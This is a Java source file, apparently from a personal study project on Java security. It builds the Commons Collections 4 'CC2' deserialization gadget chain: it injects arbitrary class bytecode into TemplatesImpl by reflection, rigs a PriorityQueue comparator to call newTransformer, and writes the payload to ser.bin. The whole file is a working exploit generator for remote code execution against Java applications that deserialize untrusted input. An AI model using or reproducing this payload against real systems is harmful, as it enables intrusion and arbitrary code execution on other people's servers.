package com.melll;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;

        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Vshex");

        Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Document\\Java安全\\CC\\CC3\\target\\classes\\com\\melll\\eval.class"));
        byte [][] codes =new byte[][]{code};
        _bytecodesField.set(templates,codes);

        //        反序列化 readobject 自动赋值 _tfactory 不需要赋值
        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator transformingComparator = new TransformingComparator<>(invokerTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator<>(new ConstantTransformer<>(1)));//add 时调用compare
        priorityQueue.add(templates);
        priorityQueue.add(2);

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,transformingComparator);

        serialize(priorityQueue);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
}